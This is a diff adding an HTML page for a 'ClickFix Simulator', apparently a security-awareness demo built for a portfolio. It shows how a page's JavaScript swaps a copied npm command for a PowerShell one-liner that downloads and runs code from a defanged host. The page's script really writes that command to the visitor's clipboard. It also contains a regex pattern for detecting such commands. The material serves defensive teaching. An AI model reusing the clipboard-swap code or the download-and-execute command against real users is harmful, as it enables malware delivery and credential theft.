@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ClickFix Simulator — Clipboard Hijack Demo | Yana Ivanov</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600;700&family=IBM+Plex+Sans:ital,wght@0,300;0,400;0,600;0,700;1,300&family=IBM+Plex+Serif:wght@400;600&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#0a0f1a;--ink3:#374151;
+  --red:#c0392b;--red-dim:rgba(192,57,43,0.08);
+  --amber:#b45309;--amber-dim:rgba(180,83,9,0.08);
+  --blue:#1a4fa0;--blue-dim:rgba(26,79,160,0.08);
+  --green:#145a32;--green-dim:rgba(20,90,50,0.08);
+  --rule:#d5cfc4;--bg:#f0ede6;--paper:#ffffff;--card:#f7f5f0;
+  --shadow:0 1px 3px rgba(0,0,0,.08),0 1px 2px rgba(0,0,0,.06);
+  --shadow-md:0 4px 6px rgba(0,0,0,.07),0 2px 4px rgba(0,0,0,.06);
+  --mono:'IBM Plex Mono',monospace;
+  --sans:'IBM Plex Sans',sans-serif;
+  --serif:'IBM Plex Serif',serif;
+}
+html{scroll-behavior:smooth;font-size:20px}
+body{font-family:var(--sans);background:var(--bg);color:var(--ink);line-height:1.7;font-size:16px}
+
+.back-nav{background:#0a0f1a;padding:.65rem 3rem;display:flex;align-items:center;border-bottom:1px solid rgba(255,255,255,.08);position:sticky;top:0;z-index:999}
+.back-nav a{font-family:'JetBrains Mono',monospace;font-size:.65rem;letter-spacing:.12em;color:#4a9eff;text-decoration:none;text-transform:uppercase;display:inline-flex;align-items:center;gap:.5rem;transition:color .2s}
+.back-nav a:hover{color:#93c5fd}
+.back-nav a::before{content:'←';font-size:.75rem}
+
+.masthead{background:#0a0f1a;color:#fff;padding:3.5rem 0 0;position:relative;overflow:hidden}
+.masthead::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 39px,rgba(255,255,255,.03) 39px,rgba(255,255,255,.03) 40px),repeating-linear-gradient(90deg,transparent,transparent 39px,rgba(255,255,255,.03) 39px,rgba(255,255,255,.03) 40px)}
+.mast-inner{max-width:900px;margin:0 auto;padding:0 3rem;position:relative;z-index:1}
+.mast-kicker{font-family:var(--mono);font-size:.7rem;letter-spacing:.2em;color:#4a9eff;text-transform:uppercase;margin-bottom:1.5rem}
+h1.title{font-family:var(--serif);font-size:clamp(2rem,5vw,3rem);font-weight:600;line-height:1.15;margin-bottom:1rem;color:#fff}
+.mast-desc{font-family:var(--sans);font-size:.95rem;color:#94a3b8;line-height:1.75;max-width:640px;margin-bottom:2rem}
+.mast-bar{background:#1a4fa0;margin-top:2.5rem;padding:.6rem 3rem;font-family:var(--mono);font-size:.72rem;letter-spacing:.08em;color:#fff;display:flex;align-items:center;gap:2rem}
+.mast-bar-dot{width:8px;height:8px;border-radius:50%;background:#fff;animation:blink 1.5s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+
+.wrap{max-width:900px;margin:0 auto;padding:0 3rem}
+.content{padding:3rem 0}
+
+/* TABS */
+.tabs{display:flex;gap:0;border-bottom:2px solid var(--rule);margin-bottom:2rem}
+.tab-btn{font-family:var(--mono);font-size:.68rem;letter-spacing:.1em;text-transform:uppercase;padding:.75rem 1.5rem;background:none;border:none;cursor:pointer;color:#94a3b8;border-bottom:2px solid transparent;margin-bottom:-2px;transition:all .2s}
+.tab-btn:hover{color:var(--ink)}
+.tab-btn.active{color:var(--blue);border-bottom-color:var(--blue);font-weight:600}
+.tab-panel{display:none}
+.tab-panel.active{display:block}
+
+/* NOTICES */
+.notice{border-radius:4px;padding:.85rem 1.1rem;margin-bottom:1rem;display:flex;gap:.75rem;align-items:flex-start;box-shadow:var(--shadow)}
+.notice.amber{background:#fffbeb;border:1px solid #fcd34d}
+.notice.red{background:#fef2f2;border:2px solid var(--red)}
+.notice-icon{font-size:1rem;flex-shrink:0;margin-top:.1rem}
+.notice-text{font-family:var(--mono);font-size:.65rem;letter-spacing:.03em;line-height:1.65}
+.notice.amber .notice-text{color:#78350f}
+.notice.red .notice-text{color:#7f1d1d}
+.notice-text strong{display:block;margin-bottom:.2rem;letter-spacing:.1em;text-transform:uppercase}
+.notice.red .notice-text strong{color:var(--red)}
+.notice.amber .notice-text strong{color:var(--amber)}
+
+/* ACTIONS */
+.action-row{display:flex;align-items:center;gap:1rem;margin-top:1.25rem;flex-wrap:wrap}
+.zbtn{font-family:var(--mono);font-size:.78rem;letter-spacing:.1em;text-transform:uppercase;padding:.85rem 2.25rem;border-radius:2px;border:none;cursor:pointer;transition:background .2s;display:inline-flex;align-items:center;gap:.5rem}
+.zbtn-run{background:#a8c4f5;color:#fff;pointer-events:none}
+.zbtn-run.ready{background:var(--blue);color:#fff;pointer-events:auto}
+.zbtn-run.ready:hover{background:#153e80}
+.zbtn-clear{background:transparent;color:#64748b;border:1px solid var(--rule);font-size:.72rem;padding:.7rem 1.75rem}
+.zbtn-clear:hover{border-color:var(--ink);color:var(--ink)}
+
+/* HOW IT WORKS */
+.how-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:1rem;margin:1.5rem 0}
+.how-card{background:var(--paper);border:1px solid var(--rule);border-top:3px solid var(--blue);border-radius:4px;padding:1.1rem;box-shadow:var(--shadow)}
+.how-num{font-family:var(--mono);font-size:.6rem;letter-spacing:.12em;color:var(--blue);text-transform:uppercase;margin-bottom:.35rem}
+.how-title{font-family:var(--serif);font-size:.92rem;font-weight:700;color:var(--ink);margin-bottom:.35rem;line-height:1.3}
+.how-desc{font-size:.82rem;color:var(--ink3);line-height:1.6}
+
+.callout{padding:1rem 1.25rem;border-radius:4px;margin:1.5rem 0;border-left:4px solid;box-shadow:var(--shadow)}
+.callout-blue{background:var(--blue-dim);border-color:var(--blue)}
+.callout-red{background:var(--red-dim);border-color:var(--red)}
+.callout p{font-size:.88rem;color:var(--ink3);line-height:1.7;margin:0}
+.callout strong{color:var(--ink)}
+
+/* FAKE BROWSER */
+.fake-site{background:var(--paper);border:1px solid var(--rule);border-radius:4px;overflow:hidden;box-shadow:var(--shadow-md);margin-bottom:1.5rem}
+.fake-browser-bar{background:#e8e8e8;padding:.5rem 1rem;display:flex;align-items:center;gap:.75rem;border-bottom:1px solid #d0d0d0}
+.fake-dots{display:flex;gap:6px}
+.fake-dot{width:12px;height:12px;border-radius:50%}
+.fake-url{background:#fff;border:1px solid #ccc;border-radius:4px;padding:.25rem .75rem;font-family:var(--mono);font-size:.65rem;color:#374151;flex:1;max-width:400px}
+.fake-site-body{padding:2rem 2.5rem}
+.fake-site-body h2{font-family:var(--serif);font-size:1.25rem;color:var(--ink);margin-bottom:.5rem}
+.fake-desc{font-size:.88rem;color:#64748b;margin-bottom:1.5rem;line-height:1.6}
+.fake-step{font-family:var(--mono);font-size:.72rem;color:var(--ink3);margin-bottom:.6rem;display:flex;align-items:center;gap:.6rem}
+.fake-step-num{background:var(--blue);color:#fff;width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.6rem;font-weight:700;flex-shrink:0}
+
+/* CODE BLOCK */
+.code-block-wrap{background:#1e2d45;border-radius:4px;overflow:hidden;margin:1.25rem 0}
+.code-block-header{background:#152238;padding:.5rem 1rem;display:flex;justify-content:space-between;align-items:center}
+.code-block-label{font-family:var(--mono);font-size:.6rem;color:#64748b;letter-spacing:.1em;text-transform:uppercase}
+.copy-btn{font-family:var(--mono);font-size:.65rem;letter-spacing:.08em;text-transform:uppercase;background:var(--blue);color:#fff;border:none;padding:.35rem .85rem;border-radius:3px;cursor:pointer;transition:background .2s}
+.copy-btn:hover{background:#153e80}
+.copy-btn.copied{background:var(--green)}
+.code-content{padding:1rem 1.25rem;font-family:var(--mono);font-size:.82rem;color:#e2e8f0;line-height:1.6}
+
+/* HIJACK ALERT */
+.hijack-alert{background:#fef2f2;border:2px solid var(--red);border-radius:4px;padding:1rem 1.25rem;margin-bottom:1.5rem;display:none}
+.hijack-alert.visible{display:block}
+.hijack-alert-title{font-family:var(--mono);font-size:.65rem;letter-spacing:.12em;text-transform:uppercase;color:var(--red);font-weight:700;margin-bottom:.5rem}
+.hijack-alert p{font-size:.85rem;color:#7f1d1d;line-height:1.65;margin:0}
+
+/* TERMINAL */
+.terminal-wrap{background:var(--paper);border:1px solid var(--rule);border-radius:4px;overflow:hidden;box-shadow:var(--shadow-md);margin-bottom:1.5rem}
+.terminal-bar{background:#1e2d45;padding:.5rem 1rem;display:flex;align-items:center;gap:.75rem}
+.terminal-dots{display:flex;gap:6px}
+.terminal-dot{width:10px;height:10px;border-radius:50%}
+.terminal-label{font-family:var(--mono);font-size:.62rem;color:#64748b;letter-spacing:.06em}
+.terminal-body{background:#0a0f1a;padding:1.25rem 1.5rem}
+.terminal-hint{font-family:var(--mono);font-size:.65rem;color:#334155;font-style:italic;margin-bottom:.75rem}
+.terminal-prompt{display:flex;align-items:center;gap:.5rem}
+.terminal-prompt-symbol{font-family:var(--mono);font-size:.82rem;color:#4a9eff}
+.terminal-input{background:transparent;border:none;outline:none;font-family:var(--mono);font-size:.82rem;color:#e2e8f0;flex:1;caret-color:#4a9eff;width:100%}
+.terminal-output{font-family:var(--mono);font-size:.78rem;line-height:1.7;margin-top:1rem;display:none;white-space:pre-wrap;word-break:break-all}
+.terminal-output.visible{display:block}
+
+/* STEP LABEL */
+.step-label{font-family:var(--mono);font-size:.62rem;letter-spacing:.15em;text-transform:uppercase;color:var(--blue);margin-bottom:.75rem;margin-top:1.5rem}
+
+/* REPORT */
+.report{background:var(--paper);border:1px solid var(--rule);border-radius:4px;overflow:hidden;box-shadow:var(--shadow-md);margin-top:1.75rem;display:none}
+.report.visible{display:block}
+.report-header{background:#0a0f1a;padding:1rem 1.5rem;display:flex;justify-content:space-between;align-items:center}
+.report-title{font-family:var(--mono);font-size:.65rem;letter-spacing:.15em;text-transform:uppercase;color:#fff}
+.report-badge{font-family:var(--mono);font-size:.62rem;letter-spacing:.1em;text-transform:uppercase;padding:.25rem .75rem;border-radius:3px;background:var(--red);color:#fff}
+.report-body{padding:1.5rem}
+.report-row{display:grid;grid-template-columns:180px 1fr;gap:.5rem 1rem;margin-bottom:1rem;padding-bottom:1rem;border-bottom:1px solid var(--rule);align-items:start}
+.report-row:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0}
+.report-label{font-family:var(--mono);font-size:.6rem;letter-spacing:.12em;text-transform:uppercase;color:#94a3b8;padding-top:.1rem}
+.report-value{font-family:var(--mono);font-size:.75rem;color:var(--ink3);line-height:1.6;word-break:break-all}
+.report-value.red{color:var(--red);font-weight:600}
+.report-value.green{color:var(--green);font-weight:600}
+.report-value.amber{color:var(--amber);font-weight:600}
+.report-summary{background:var(--red-dim);border-left:4px solid var(--red);padding:1rem 1.25rem;margin-top:1.25rem;font-size:.85rem;color:#7f1d1d;line-height:1.65}
+.report-summary strong{color:var(--red);display:block;font-family:var(--mono);font-size:.62rem;letter-spacing:.1em;text-transform:uppercase;margin-bottom:.4rem}
+
+/* SIGNALS */
+.signal-list{margin:1.5rem 0}
+.signal-item{background:var(--paper);border:1px solid var(--rule);border-radius:4px;padding:1rem 1.25rem;margin-bottom:.75rem;display:grid;grid-template-columns:2rem 1fr;gap:.75rem;align-items:start;box-shadow:var(--shadow)}
+.signal-num{width:2rem;height:2rem;border-radius:50%;background:var(--red);color:#fff;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:.72rem;font-weight:700;flex-shrink:0;margin-top:.1rem}
+.signal-title{font-family:var(--mono);font-size:.75rem;font-weight:600;color:var(--ink);margin-bottom:.3rem;letter-spacing:.02em}
+.signal-desc{font-size:.82rem;color:var(--ink3);line-height:1.6}
+
+/* CHAIN TABLE */
+.chain-table{width:100%;border-collapse:collapse;font-size:.82rem;margin:1.25rem 0;box-shadow:var(--shadow);border-radius:4px;overflow:hidden}
+.chain-table thead tr{background:#0a0f1a;color:#fff}
+.chain-table th{padding:.7rem 1rem;text-align:left;font-family:var(--mono);font-size:.65rem;letter-spacing:.1em}
+.chain-table td{padding:.65rem 1rem;border-bottom:1px solid var(--rule);color:var(--ink3);vertical-align:top;font-size:.82rem}
+.chain-table tr:last-child td{border-bottom:none}
+.chain-table tr:nth-child(even) td{background:rgba(0,0,0,.018)}
+.chain-table td.stage{font-family:var(--mono);font-size:.72rem;font-weight:600}
+.chain-table td.stage.amber{color:var(--amber)}
+.chain-table td.stage.red{color:var(--red)}
+
+footer{background:#1e2d45;color:#64748b;padding:1.5rem 3rem;font-family:var(--mono);font-size:.7rem;letter-spacing:.06em;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:.5rem}
+footer a{color:#4a9eff;text-decoration:none}
+
+@media(max-width:680px){
+  .mast-inner,.wrap{padding-left:1.5rem;padding-right:1.5rem}
+  .how-grid{grid-template-columns:1fr}
+  .report-row{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+
+<div class="back-nav"><a href="/">Portfolio</a></div>
+
+<div class="masthead">
+  <div class="mast-inner">
+    <div class="mast-kicker">Analyst Toolkit · Social Engineering</div>
+    <h1 class="title">ClickFix Simulator</h1>
+    <p class="mast-desc">A live demonstration of clipboard hijacking — the social engineering technique used to deliver TELEPUZ and dozens of other malware families in 2026. See exactly what happens between copy and paste. Runs entirely in your browser. No data leaves your machine.</p>
+  </div>
+  <div class="mast-bar">
+    <div class="mast-bar-dot"></div>
+    BROWSER-BASED &nbsp;·&nbsp; NO SERVER &nbsp;·&nbsp; NO DATA UPLOAD &nbsp;·&nbsp; EDUCATIONAL USE ONLY
+  </div>
+</div>
+
+<div class="wrap"><div class="content">
+
+  <div class="notice amber">
+    <span class="notice-icon">⚠️</span>
+    <div class="notice-text">
+      <strong>Educational Demonstration Only</strong>
+      This tool simulates a ClickFix clipboard hijack using a defanged, non-functional payload for awareness training. No real malware is involved. The command shown is based on the TELEPUZ campaign documented by Elastic Security Labs (July 2026) and has been modified to be completely harmless.
+    </div>
+  </div>
+
+  <div class="tabs">
+    <button class="tab-btn active" onclick="switchTab('demo',this)">Live Demo</button>
+    <button class="tab-btn" onclick="switchTab('how',this)">How It Works</button>
+    <button class="tab-btn" onclick="switchTab('signals',this)">What to Watch For</button>
+  </div>
+
+  <!-- TAB 1: DEMO -->
+  <div class="tab-panel active" id="panel-demo">
+
+    <div class="step-label" style="margin-top:0">Step 1 — Copy the command from the page below</div>
+
+    <div class="fake-site">
+      <div class="fake-browser-bar">
+        <div class="fake-dots">
+          <div class="fake-dot" style="background:#ff5f56"></div>
+          <div class="fake-dot" style="background:#ffbd2e"></div>
+          <div class="fake-dot" style="background:#27c93f"></div>
+        </div>
+        <div class="fake-url">docs.config-helper.dev/install</div>
+      </div>
+      <div class="fake-site-body">
+        <h2>Quick Install — @utils/config-helper</h2>
+        <p class="fake-desc">The fastest way to get started. Copy the command below and paste it into your terminal.</p>
+        <div class="fake-step"><div class="fake-step-num">1</div>Make sure Node.js 18+ is installed</div>
+        <div class="fake-step"><div class="fake-step-num">2</div>Copy the install command below</div>
+        <div class="fake-step"><div class="fake-step-num">3</div>Paste and run in your terminal</div>
+        <div class="code-block-wrap">
+          <div class="code-block-header">
+            <span class="code-block-label">Install Command</span>
+            <button class="copy-btn" id="copyBtn" onclick="simulateHijack()">Copy</button>
+          </div>
+          <div class="code-content">npm install @utils/config-helper</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="hijack-alert" id="hijackAlert">
+      <div class="hijack-alert-title">⚠ Clipboard Hijacked — You Have No Way to Know This Happened</div>
+      <p>You clicked Copy. JavaScript on the page silently replaced your clipboard with a malicious PowerShell command. The page looks exactly the same. Nothing changed visually. Your clipboard now contains something you never read. Now paste into the terminal below.</p>
+    </div>
+
+    <div class="step-label">Step 2 — Paste into the terminal below and click Run</div>
+
+    <div class="terminal-wrap">
+      <div class="terminal-bar">
+        <div class="terminal-dots">
+          <div class="terminal-dot" style="background:#ff5f56"></div>
+          <div class="terminal-dot" style="background:#ffbd2e;margin-left:4px"></div>
+          <div class="terminal-dot" style="background:#27c93f;margin-left:4px"></div>
+        </div>
+        <span class="terminal-label">Terminal — bash</span>
+      </div>
+      <div class="terminal-body">
+        <div class="terminal-hint">Paste here with Cmd+V or Ctrl+V, then click Run</div>
+        <div class="terminal-prompt">
+          <span class="terminal-prompt-symbol">$</span>
+          <input class="terminal-input" id="terminalInput" type="text" placeholder="paste command here..." oninput="checkInput()" onpaste="handlePaste()">
+        </div>
+        <div class="terminal-output" id="terminalOutput"></div>
+      </div>
+    </div>
+
+    <div class="action-row">
+      <button class="zbtn zbtn-run" id="runBtn" onclick="runCommand()">
+        <span>▶</span> Run
+      </button>
+      <button class="zbtn zbtn-clear" onclick="resetDemo()">Reset Demo</button>
+    </div>
+
+    <div class="report" id="report">
+      <div class="report-header">
+        <span class="report-title">ClickFix Detection Report</span>
+        <span class="report-badge" id="reportBadge">THREAT DETECTED</span>
+      </div>
+      <div class="report-body">
+        <div class="report-row">
+          <div class="report-label">What You Saw on the Page</div>
+          <div class="report-value green">npm install @utils/config-helper</div>
+        </div>
+        <div class="report-row">
+          <div class="report-label">What Was in Your Clipboard</div>
+          <div class="report-value red" id="reportActual"></div>
+        </div>
+        <div class="report-row">
+          <div class="report-label">Attack Type</div>
+          <div class="report-value amber">ClickFix — JavaScript Clipboard Hijack</div>
+        </div>
+        <div class="report-row">
+          <div class="report-label">Payload Family</div>
+          <div class="report-value red" id="reportFamily"></div>
+        </div>
+        <div class="report-row">
+          <div class="report-label">What Would Happen</div>
+          <div class="report-value red" id="reportOutcome"></div>
+        </div>
+        <div class="report-summary">
+          <strong>What just happened to you</strong>
+          You copied what looked like a routine npm install command. JavaScript on the page replaced your clipboard with a PowerShell command that would have downloaded and executed TELEPUZ — a modular MaaS payload active since April 2026 with 36 commands including a keylogger, credential stealer, Chrome cookie extractor, and a Polygon blockchain-based C2. You saw nothing unusual. The page looked legitimate. The action felt mechanical. That is exactly how ClickFix works.
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- TAB 2: HOW IT WORKS -->
+  <div class="tab-panel" id="panel-how">
+
+    <p style="font-size:.92rem;color:var(--ink3);margin-bottom:1.5rem;line-height:1.75">ClickFix is not a software vulnerability. There is no CVE, no exploit, no zero-day. It is a manipulation of a reflex so ordinary most people never question it — the copy-paste action that happens dozens of times a day without conscious thought.</p>
+
+    <div class="how-grid">
+      <div class="how-card">
+        <div class="how-num">Moment One</div>
+        <div class="how-title">You Click Copy</div>
+        <div class="how-desc">JavaScript fires the moment you interact with the copy button or press Cmd+C. In a single silent operation it overwrites your clipboard with a malicious command. The page shows no error. Nothing changes visually. The action takes milliseconds.</div>
+      </div>
+      <div class="how-card">
+        <div class="how-num">Moment Two</div>
+        <div class="how-title">You Paste and Run</div>
+        <div class="how-desc">You open your terminal and paste. The input field shows the malicious command — but you expect to see what you copied, so you may not read it carefully. You hit Enter. The command executes. The attack is complete before you have any indication something is wrong.</div>
+      </div>
+      <div class="how-card">
+        <div class="how-num">Why It Works</div>
+        <div class="how-title">You Are the Execution Engine</div>
+        <div class="how-desc">No exploit needed. No file to download. No browser vulnerability. The user runs the command themselves — bypassing endpoint detection that looks for files landing on disk. The email that sent you to the page is where the chain starts. That is where it can be stopped.</div>
+      </div>
+    </div>
+
+    <div class="callout callout-red">
+      <p><strong>The TELEPUZ connection:</strong> In the campaign documented by Elastic Security Labs (July 16, 2026), the ClickFix lure delivered a PowerShell command that downloaded VIDAR, which installed TELEPUZ — a modular MaaS payload with keylogging, credential theft, Chrome cookie extraction, UAC bypass, and a Polygon blockchain smart contract used as both a C2 resolver and a kill switch. The email that delivered the link is where the chain starts and where it can be stopped.</p>
+    </div>
+
+    <h3 style="font-family:var(--serif);font-size:1.1rem;font-weight:700;color:var(--ink);margin:2rem 0 .75rem">The TELEPUZ Infection Chain</h3>
+    <table class="chain-table">
+      <thead><tr><th>Stage</th><th>Component</th><th>What It Does</th></tr></thead>
+      <tbody>
+        <tr><td class="stage amber">Email</td><td>Phishing lure</td><td>Unsolicited email with link to fake documentation or CAPTCHA page</td></tr>
+        <tr><td class="stage red">Stage 1</td><td>ClickFix</td><td>JavaScript hijacks clipboard; user executes PowerShell thinking it is something else</td></tr>
+        <tr><td class="stage red">Stage 2</td><td>VIDAR (Go variant)</td><td>Dropper — downloads TELEPUZ stager and main payload from staging domain</td></tr>
+        <tr><td class="stage red">Stage 3</td><td>TELEPUZ</td><td>Full MaaS payload — 36 commands, keylogger, stealer, blockchain C2, UAC bypass, SYSTEM privilege escalation</td></tr>
+      </tbody>
+    </table>
+
+  </div>
+
+  <!-- TAB 3: SIGNALS -->
+  <div class="tab-panel" id="panel-signals">
+
+    <p style="font-size:.92rem;color:var(--ink3);margin-bottom:1.5rem;line-height:1.75">Four things to check before you paste a command from the internet — or click a link from an unsolicited email.</p>
+
+    <div class="signal-list">
+      <div class="signal-item">
+        <div class="signal-num">1</div>
+        <div>
+          <div class="signal-title">Read What You Paste Before You Run It</div>
+          <div class="signal-desc">Before pressing Enter, look at the actual text in your terminal input — not the page you copied from. If it does not match what you expected, you have caught a ClickFix attack. This single habit stops it unconditionally.</div>
+        </div>
+      </div>
+      <div class="signal-item">
+        <div class="signal-num">2</div>
+        <div>
+          <div class="signal-title">Any Page That Asks You to Paste Into a Terminal Is Suspicious</div>
+          <div class="signal-desc">Legitimate documentation gives you commands to copy and run. A page that creates urgency around pasting — a CAPTCHA that requires you to run a command, an error page that asks you to "fix" something by pasting — is a ClickFix lure regardless of how official it looks.</div>
+        </div>
+      </div>
+      <div class="signal-item">
+        <div class="signal-num">3</div>
+        <div>
+          <div class="signal-title">Check the Link Destination Before You Click</div>
+          <div class="signal-desc">Hover over links in email before clicking. In the TELEPUZ campaign, every staging domain used a non-standard TLD — .lol, .shop, .lat, .click, .sbs, .cfd, .asia, .xyz, .club. No legitimate developer documentation lives on these domains. If you see one in an unsolicited email, stop.</div>
+        </div>
+      </div>
+      <div class="signal-item">
+        <div class="signal-num">4</div>
+        <div>
+          <div class="signal-title">If You Email Commands to Yourself — Read Them Before You Run</div>
+          <div class="signal-desc">A common workflow: copy a command, email it to yourself to use later on another machine. If the clipboard was hijacked when you copied, the malicious command is now in your sent mail. Your future self will paste it without suspicion. Paste into a plain text editor first, read it, then run it.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout callout-blue">
+      <p><strong>For security teams:</strong> ClickFix campaigns are email-delivered. The phishing message is the first contact and the cleanest detection opportunity — before the clipboard is touched, before any code runs. Detection rules targeting the email delivery layer (suspicious TLDs in links, urgency language, unsolicited senders) can interrupt the chain at stage zero. A companion Sublime Security detection rule targeting ClickFix email delivery patterns is in development.</p>
+    </div>
+
+  </div>
+
+</div></div>
+
+<footer>
+  <span>ClickFix Simulator &nbsp;·&nbsp; Yana Ivanov &nbsp;·&nbsp; 2026 &nbsp;·&nbsp; Educational use only &nbsp;·&nbsp; No real malware involved</span>
+  <a href="/" style="color:#4a9eff;text-decoration:none">← Portfolio</a>
+</footer>
+
+<script>
+const VISIBLE = 'npm install @utils/config-helper';
+const HIJACKED = 'powershell -NoP -w h -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'https://memshowblob[.]forum/api/index.php?a=grab\')"';
+
+let hijacked = false;
+
+function switchTab(id, btn) {
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('panel-' + id).classList.add('active');
+  btn.classList.add('active');
+}
+
+function simulateHijack() {
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(HIJACKED).catch(() => {});
+  }
+  hijacked = true;
+  const btn = document.getElementById('copyBtn');
+  btn.textContent = 'Copied!';
+  btn.classList.add('copied');
+  document.getElementById('hijackAlert').classList.add('visible');
+  setTimeout(() => {
+    document.getElementById('terminalInput').scrollIntoView({behavior:'smooth', block:'center'});
+  }, 500);
+}
+
+function handlePaste() {
+  setTimeout(checkInput, 50);
+}
+
+function checkInput() {
+  const val = document.getElementById('terminalInput').value.trim();
+  if (val.length > 2) {
+    document.getElementById('runBtn').classList.add('ready');
+  }
+}
+
+function runCommand() {
+  const input = document.getElementById('terminalInput').value.trim();
+  if (!input) return;
+
+  const out = document.getElementById('terminalOutput');
+  const report = document.getElementById('report');
+  const isAttack = hijacked && input !== VISIBLE;
+  const looksEvil = /powershell|iex|downloadstring|bypass|invoke/i.test(input);
+
+  out.classList.add('visible');
+
+  if (isAttack || looksEvil) {
+    out.innerHTML = '<span style="color:#ef4444">⚠ CLICKFIX SIMULATOR — INTERCEPTED</span>\n<span style="color:#64748b">This is not what the page showed you.</span>\n<span style="color:#64748b">In a real attack, this command would now be executing on your machine.</span>';
+    document.getElementById('reportActual').textContent = input;
+    document.getElementById('reportFamily').textContent = 'TELEPUZ (MaaS) — Active campaign since April 2026. Documented by Elastic Security Labs July 16, 2026.';
+    document.getElementById('reportOutcome').textContent = 'PowerShell silently downloads a VIDAR dropper from memshowblob[.]forum, which installs TELEPUZ — a modular payload with keylogger, credential stealer, Chrome cookie extractor, and Polygon blockchain C2.';
+    document.getElementById('reportBadge').textContent = 'THREAT DETECTED';
+    document.getElementById('reportBadge').style.background = 'var(--red)';
+  } else {
+    out.innerHTML = '<span style="color:#4ade80">✓ Command matched what was shown — no hijack detected in this run.</span>\n<span style="color:#64748b">Try clicking the Copy button on the fake page above, then paste here.</span>';
+    document.getElementById('reportActual').textContent = input || '(empty)';
+    document.getElementById('reportFamily').textContent = 'No known payload detected.';
+    document.getElementById('reportOutcome').textContent = 'No clipboard hijack detected. You either typed manually or clicked Copy before the hijack was triggered.';
+    document.getElementById('reportBadge').textContent = 'NO THREAT';
+    document.getElementById('reportBadge').style.background = 'var(--green)';
+  }
+
+  report.classList.add('visible');
+  setTimeout(() => report.scrollIntoView({behavior:'smooth', block:'start'}), 200);
+}
+
+function resetDemo() {
+  hijacked = false;
+  document.getElementById('copyBtn').textContent = 'Copy';
+  document.getElementById('copyBtn').classList.remove('copied');
+  document.getElementById('hijackAlert').classList.remove('visible');
+  document.getElementById('terminalInput').value = '';
+  document.getElementById('terminalOutput').classList.remove('visible');
+  document.getElementById('terminalOutput').innerHTML = '';
+  document.getElementById('report').classList.remove('visible');
+  document.getElementById('runBtn').classList.remove('ready');
+  window.scrollTo({top:0, behavior:'smooth'});
+}
+</script>
+</body>
+</html>
